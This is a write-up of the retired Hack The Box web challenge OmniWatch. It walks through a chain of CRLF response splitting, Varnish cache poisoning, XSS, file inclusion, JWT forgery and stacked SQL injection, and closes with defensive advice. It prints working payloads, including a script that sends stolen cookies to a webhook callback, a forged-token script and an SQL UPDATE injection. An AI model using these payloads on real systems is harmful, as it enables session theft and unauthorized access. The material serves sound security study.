---
title: "Hack The Box Challenge — OmniWatch"
summary: "OmniWatch chains Zig CRLF response splitting, Varnish cache poisoning, bot-targeted XSS, firmware LFI, JWT forgery and stacked SQL injection."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Hard"
solvedAt: 2026-09-16
publishedAt: 2026-09-16
tags:
  - web-security
  - crlf-injection
  - http-response-splitting
  - varnish-cache-poisoning
  - cross-site-scripting
  - race-condition
  - local-file-inclusion
  - jwt-forgery
  - stacked-sql-injection
  - source-code-review
tools:
  - tree
  - curl
  - PowerShell
  - Webhook.site
cves: []
htbUrl: "https://app.hackthebox.com/challenges/OmniWatch"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge OmniWatch. Retirement and publication eligibility were confirmed on 16 September 2026 from the retired challenge page, where the official write-up was available, and by the user who launched the lab. The flag, target address, JWTs, cookies, signing secret, webhook identifier and account-specific screenshots have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

OmniWatch is a source-assisted Web challenge composed of a Flask controller, a Zig oracle service, MySQL, a Chromium moderator bot and Varnish in front of both applications. No single bug reaches the flag. The intended path crosses several trust boundaries.

The Zig service URL-decodes route parameters before placing one in a response header, allowing CRLF response splitting. Injecting `CacheKey: enable` makes Varnish retain an attacker-controlled response, while the cache hash depends only on the request's `CacheKey` header. An XSS payload can therefore be cached and delivered to the authenticated moderator bot. The stolen moderator JWT unlocks a firmware preview endpoint whose unsanitized path provides local file inclusion and reveals the JWT signing key.

A correctly signed administrator token is still rejected because the application compares its signature with a database record. The final step is a stacked SQL injection in the device lookup route, used to replace the accepted signature for `user_id=1`. The forged administrator JWT then returns the admin page and an HTB-formatted flag, which is deliberately omitted here.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `OmniWatch` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Hard |
| Status | Retired, confirmed 16 September 2026 |
| Front end | Flask controller behind Varnish |
| Supporting service | Zig oracle API |
| Core chain | CRLF injection → cache poisoning → XSS → LFI → JWT forgery → stacked SQL injection |

The scenario described a web interface used by the fictional Gunners group to track targets. The supplied service names immediately suggested that the controller/oracle boundary and the tracking requests deserved attention.

## Provided material and evidence boundaries

The supplied package tree contained 71 files. The parts that shaped the investigation were:

```text
.
├── challenge
│   ├── controller
│   │   ├── application
│   │   │   ├── blueprints/routes.py
│   │   │   ├── firmware/
│   │   │   └── util/
│   │   │       ├── bot.py
│   │   │       ├── database.py
│   │   │       └── jwt.py
│   │   └── seed.py
│   └── oracle
│       ├── modules/
│       └── src/main.zig
├── config
│   ├── cache.vcl
│   ├── readflag.c
│   └── supervisord.conf
├── Dockerfile
├── entrypoint.sh
└── flag.txt
```

The original ZIP remained in the user's lab environment and was never added to this repository. The shared Codex workspace contained the tree, screenshots and full command history, but not the extracted source. Consequently, source-level control flow in this article was reconstructed from those artifacts and a public independent write-up, then checked against live behavior. Every exploit transition described as verified below was executed successfully against the retired challenge instance.

The target address was ephemeral and is shown as `<TARGET>`. Authentication material, the 12-byte signing secret and the final flag are represented by placeholders.

## Initial analysis

The public entry point redirected to the controller login page. A direct request established both the backend and the caching layer:

```bash
curl -i --max-time 12 http://<TARGET>/controller/login
```

The relevant headers were:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.2
Cache-Control: public, max-age=0
Via: 1.1 varnish (Varnish/6.5)
X-Cache: MISS
```

This confirmed a Flask/Werkzeug controller behind Varnish 6.5. The package tree exposed the rest of the architecture: a second HTTP service written in Zig, a recurring browser bot, MySQL-backed JWT signature checks and a privileged `readflag` helper.

The useful source-assisted observations were:

- `/oracle/<mode>/<deviceId>` URL-decodes both route parameters.
- The decoded device ID is written into a `DeviceId` response header.
- Non-`json` modes are interpolated into an HTML template.
- `cache.vcl` caches a backend response for ten seconds when it contains `CacheKey: enable`.
- The Varnish hash uses the request's `CacheKey` header rather than the normal URL/host identity.
- The bot logs in as a moderator and later visits a random oracle device.

Those behaviors suggested a chain rather than an authentication bypass: inject response headers in the oracle, turn the oracle body into executable HTML, cache it globally, and wait for the authenticated bot.

## Identifying the weaknesses

### CRLF response splitting in the Zig oracle

The critical data flow was equivalent to:

```zig
const decodedDeviceId = try std.Uri.unescapeString(allocator, deviceId);
res.header("DeviceId", decodedDeviceId);
```

If `deviceId` contains URL-encoded carriage-return and line-feed bytes, decoding occurs before the value reaches the response header. A value such as:

```text
marker-7e4b%0D%0ACacheKey%3A%20enable
```

is interpreted as:

```http
DeviceId: marker-7e4b
CacheKey: enable
```

This is HTTP response splitting: attacker-controlled data escapes the intended header value and begins additional response headers.

### Varnish turns the split response into shared state

The relevant VCL behavior reconstructed from `cache.vcl` was:

```text
sub vcl_backend_response {
    if (beresp.http.CacheKey == "enable") {
        set beresp.ttl = 10 s;
        set beresp.http.Cache-Control = "public, max-age=10";
    } else {
        set beresp.ttl = 0 s;
    }
}

sub vcl_hash {
    hash_data(req.http.CacheKey);
    return (lookup);
}
```

The first block lets an injected backend header opt the response into caching. The second collapses unrelated URLs into the same cache entry whenever their request `CacheKey` values match.

This was verified with a harmless marker:

```bash
curl -sS -i -H 'CacheKey: probe-7e4b' \
  'http://<TARGET>/oracle/json/marker-7e4b%0D%0ACacheKey%3A%20enable'

curl -sS -i -H 'CacheKey: probe-7e4b' \
  'http://<TARGET>/controller/login'
```

The first response came from the oracle and populated the cache:

```http
HTTP/1.1 200 OK
DeviceId: marker-7e4b
CacheKey: enable
Cache-Control: public, max-age=10
X-Cache: MISS
```

The second request targeted the completely different controller login URL but returned the oracle response:

```http
HTTP/1.1 200 OK
DeviceId: marker-7e4b
X-Cache: HIT
X-Cache-Hits: 1
```

That `HIT` proved the cache key collision directly. The exploit no longer depended on guessing how Varnish behaved.

### HTML injection becomes XSS

The oracle sets `X-Content-Type-Options: nosniff`, and its non-JSON response does not naturally provide the required HTML content type. Response splitting also solves that constraint by injecting:

```http
CacheKey: enable
X-Content-Type-Options: undefined
Content-Type: text/html
```

The mode parameter is then rendered inside the response body. A diagnostic request produced a valid HTML document containing the injected script:

```html
<p>Mode:
  <script>
    /* attacker-controlled JavaScript */
  </script>
</p>
```

The same response was cacheable for ten seconds, creating a short-lived stored-XSS condition for every request in the default cache bucket.

### The moderator bot creates a race window

The bot sequence was reconstructed as:

```text
GET /controller/login
wait 3 seconds
submit moderator credentials
wait 3 seconds
GET /oracle/json/<random-device>
wait 10 seconds
```

Poisoning too early replaces the login page, so the bot cannot find the username, password and login button. Poisoning too late misses the oracle navigation. The exposed `/controller/bot_running` endpoint supplied the timing signal.

The final workflow waited for a clean `not_running → running` transition, slept approximately 3.1 seconds, then cached the XSS response. The sanitized payload used an image request so that reading a cross-origin response was unnecessary:

```javascript
new Image().src =
  'https://webhook.site/<WEBHOOK_ID>/exfiltrate?cookies=' +
  encodeURIComponent(document.cookie);
```

The response-splitting suffix was appended to the device ID:

```text
\r\nCacheKey: enable
\r\nX-Content-Type-Options: undefined
\r\nContent-Type: text/html
```

The live run recorded:

```text
BOT_START=<TIMESTAMP>
POISON_STATUS=200 CACHE=MISS
WEBHOOK_URL=https://webhook.site/<WEBHOOK_ID>/exfiltrate?cookies=jwt%3D<REDACTED>
```

The decoded cookie contained a valid JWT for `user_id=1` with `account_type` set to `moderator`.

## Chronological exploitation

### 1. Using the moderator JWT

Requesting the admin page with the stolen cookie did not immediately expose the flag:

```bash
curl -i -b 'jwt=<MODERATOR_JWT>' \
  http://<TARGET>/controller/admin
```

The server correctly redirected the moderator to the home page:

```http
HTTP/1.1 302 FOUND
Location: /controller/home
```

The token was nevertheless valuable because it granted access to the authenticated firmware and device routes.

### 2. Reading the signing secret through the firmware preview

The firmware POST handler joined the supplied `patch` value to its firmware directory and opened the result. An absolute POSIX path discards the earlier join components, so the following executed request escaped the intended directory:

```bash
curl -sS -i -b 'jwt=<MODERATOR_JWT>' \
  -X POST \
  --data-urlencode 'patch=/app/jwt_secret.txt' \
  http://<TARGET>/controller/firmware
```

The response confirmed the file read:

```http
HTTP/1.1 200 OK
Content-Length: 12

<REDACTED_JWT_SECRET>
```

Only the length is preserved. The challenge signing secret is intentionally not published.

### 3. Forging an administrator token

The recovered secret was used locally to create an HS256 token whose claims were:

```json
{
  "user_id": 1,
  "username": "ilias1988",
  "account_type": "administrator"
}
```

The following sanitized PowerShell reproduces the exact signing logic used during the solve:

```powershell
$secret = '<REDACTED_JWT_SECRET>'

function ConvertTo-Base64Url([byte[]]$Bytes) {
    [Convert]::ToBase64String($Bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

$header = ConvertTo-Base64Url(
    [Text.Encoding]::UTF8.GetBytes('{"alg":"HS256","typ":"JWT"}')
)
$payload = ConvertTo-Base64Url(
    [Text.Encoding]::UTF8.GetBytes(
        '{"user_id":1,"username":"ilias1988","account_type":"administrator"}'
    )
)
$unsigned = "$header.$payload"
$hmac = [Security.Cryptography.HMACSHA256]::new(
    [Text.Encoding]::UTF8.GetBytes($secret)
)
$signature = ConvertTo-Base64Url(
    $hmac.ComputeHash([Text.Encoding]::ASCII.GetBytes($unsigned))
)
$adminJwt = "$unsigned.$signature"
```

Cryptographic validity alone was insufficient. The JWT middleware also compared the third JWT segment with a signature stored in MySQL. The new token therefore needed a matching database entry.

### 4. Replacing the accepted signature with stacked SQL injection

The device route passed its path parameter to an unsafe query, and the database connection permitted multiple statements. The base64url signature string—not the raw HMAC bytes—was converted to ASCII hexadecimal:

```powershell
$signatureHex = (
    [BitConverter]::ToString([Text.Encoding]::ASCII.GetBytes($signature))
).Replace('-', '').ToLowerInvariant()
```

The executed injection had this logical form:

```sql
1' OR '1'='1' LIMIT 1;
UPDATE signatures
SET signature = 0x<HEX_OF_BASE64URL_SIGNATURE>
WHERE user_id = 1;
-- <required trailing whitespace>
```

It was URL-encoded into the device path and requested with the still-valid moderator cookie:

```powershell
$sqli = "1' OR '1'='1' LIMIT 1; " +
        "UPDATE signatures SET signature = 0x$signatureHex " +
        "WHERE user_id = 1; -- "
$encoded = [Uri]::EscapeDataString($sqli)

curl.exe -sS -i --path-as-is \
  -b 'jwt=<MODERATOR_JWT>' \
  "http://<TARGET>/controller/device/$encoded"
```

The response rendered `OmniWatch - Device 1` with HTTP 200. That showed the first statement still returned a legitimate device while the stacked `UPDATE` changed the signature record. The trailing space after `--` was significant because MySQL requires whitespace after its double-dash comment marker.

Updating the database invalidated the old moderator token's allow-listed signature and admitted the newly forged administrator token instead.

### 5. Retrieving the protected result

The final request used the forged token:

```bash
curl -sS -i -b 'jwt=<ADMINISTRATOR_JWT>' \
  http://<TARGET>/controller/admin
```

The decisive part of the response was:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<title>OmniWatch - Admin</title>
...
<h3>HTB{<REDACTED_FLAG>}</h3>
```

This verified the complete chain: the token passed HS256 verification, its signature matched the database, its role satisfied the administrator middleware, and the protected page returned an HTB-formatted value.

## Minimal exploit workflow

No standalone solver file was created during the solve. The verified exploit was assembled interactively in PowerShell and `curl`. The minimal reproducible workflow is:

1. Poll `/controller/bot_running` until a clean start transition.
2. After the bot has loaded the real login page, cache an oracle response containing the XSS payload and injected Varnish/MIME headers.
3. Capture the moderator JWT at an operator-controlled callback endpoint.
4. Use the moderator cookie to POST the absolute `/app/jwt_secret.txt` path to `/controller/firmware`.
5. Sign an administrator HS256 JWT with `user_id=1`.
6. Convert its base64url signature segment to ASCII hex.
7. Send the stacked `UPDATE` through `/controller/device/<encoded-id>`.
8. Request `/controller/admin` with the forged JWT.

The callback inbox used during the verified run was deleted immediately afterward. Deletion returned `204 No Content`, and a follow-up lookup returned `404 Not Found`.

## Validation

The chain was validated incrementally:

1. The login response identified Werkzeug behind Varnish.
2. A CRLF marker created a new response header.
3. A controller URL returned the cached oracle response with `X-Cache: HIT`.
4. The bot status endpoint provided a repeatable race trigger.
5. The callback received a JWT whose decoded role was `moderator`.
6. The admin route redirected that token, proving role enforcement was active.
7. The firmware POST returned exactly 12 bytes from the signing-key path.
8. The injected device request returned the expected Device 1 page after the stacked update.
9. The forged JWT returned the admin page with HTTP 200 and an HTB-formatted value.

The platform submission action itself was not captured in the supplied evidence, so no separate claim is made about an HTB UI acceptance event.

## Failed approaches and useful diagnostics

### Writing the cookie into a second Varnish bucket

Before using an external callback, the first approach tried to keep all session data inside the challenge. The cached XSS called the oracle again with `document.cookie` embedded in the `DeviceId` path and supplied a unique request `CacheKey`. The idea was to retrieve the resulting cached `DeviceId` header from that isolated bucket.

The underlying cache primitive worked with a static marker, but the browser-driven request did not create an observable loot entry. The evidence did not identify whether the custom request header, script timing or browser behavior was responsible, so the article does not assign an unsupported root cause.

### Waiting for the original cache entry to expire

A second same-instance experiment scheduled a navigation until after the ten-second malicious entry should have expired. The new navigation would have placed the cookie in a fresh oracle response header under the default cache key. It also failed to produce a retrievable entry.

These attempts were still valuable: they separated the confirmed Varnish primitive from the unconfirmed browser-to-cache exfiltration channel. The final callback used a simple outbound image request, reducing the race to a single cached page load.

## Why the full chain works

The challenge repeatedly validates one representation while another component consumes a more dangerous representation:

1. **URL parameter versus HTTP header:** the router accepts encoded text, but decoding creates CRLF bytes before header serialization.
2. **Backend response versus cache policy:** the oracle should not control caching, yet an injected response header directly enables it.
3. **URL identity versus cache identity:** unrelated paths collide because the custom hash considers only `req.http.CacheKey`.
4. **Unauthenticated attacker versus authenticated browser:** the bot supplies the moderator context that the attacker lacks.
5. **Firmware filename versus filesystem path:** the UI presents two firmware choices, but the server accepts an arbitrary absolute path.
6. **JWT cryptography versus application allow-list:** the leaked key satisfies HMAC verification, while SQL injection satisfies the separate database signature check.
7. **Single path value versus multiple SQL statements:** the device identifier becomes both a valid first query result and a state-changing `UPDATE`.

The security controls are not absent; they are disconnected. Varnish caching, MIME protections, moderator authorization and the signature allow-list each provide some resistance in isolation, but parser confusion and unsafe data flow bridge every boundary.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| CRLF in decoded header values | Reject control characters after decoding and use an HTTP library that refuses invalid response-header values |
| Backend-controlled cache opt-in | Define cacheability at the proxy from trusted route policy, never from an arbitrary backend header |
| Cache key ignores URL and host | Retain the normal scheme/host/path/query identity and vary only on explicit, validated request attributes |
| Bot visits attacker-influenced content | Isolate automation, use a dedicated origin and low-privilege account, and apply a restrictive Content Security Policy |
| Session accessible to JavaScript | Mark authentication cookies `HttpOnly`, `Secure` and with an appropriate `SameSite` policy |
| Absolute path accepted as firmware name | Map server-side identifiers to allow-listed files and verify the resolved path remains beneath the firmware directory |
| JWT key stored in readable application path | Use a secrets manager or protected runtime secret and rotate the key after suspected disclosure |
| JWT signature allow-list writable through SQLi | Use parameterized queries, disable multi-statements, and avoid storing redundant token signatures unless revocation requires it |
| Role trusted from a long-lived token | Keep authorization state server-side or use short-lived tokens with robust revocation and key rotation |

Detection should correlate unusual `%0d%0a` sequences, injected `CacheKey` response headers, cache hits across unrelated paths, firmware requests containing absolute paths, semicolons or comments in device IDs, and unexpected updates to the signature table.

## Key takeaways

- Cache poisoning is often a composition bug: a response-splitting primitive becomes far more serious when cache identity is incomplete.
- Browser-bot challenges frequently depend on timing. Observe the bot's state transition instead of continuously poisoning and accidentally breaking its login page.
- A leaked JWT secret does not always finish an authentication bypass; application-specific token allow-lists and revocation checks must also be understood.
- An `UPDATE` executed through stacked SQL injection can be more useful than direct data extraction when the application maintains security state in the database.
- Validate exploit chains at every boundary. The harmless marker and cross-URL `HIT` removed uncertainty before any authenticated session was involved.
- Failed exfiltration designs are worth recording when they distinguish a confirmed vulnerability from an unsupported assumption about browser behavior.

## References

- [Hack The Box — OmniWatch](https://app.hackthebox.com/challenges/OmniWatch)
- [REAPSEC — OmniWatch independent write-up](https://blog.reapsec.com/omniwatch-htb)
- [Webhook.site API documentation](https://docs.webhook.site/api/about.html)
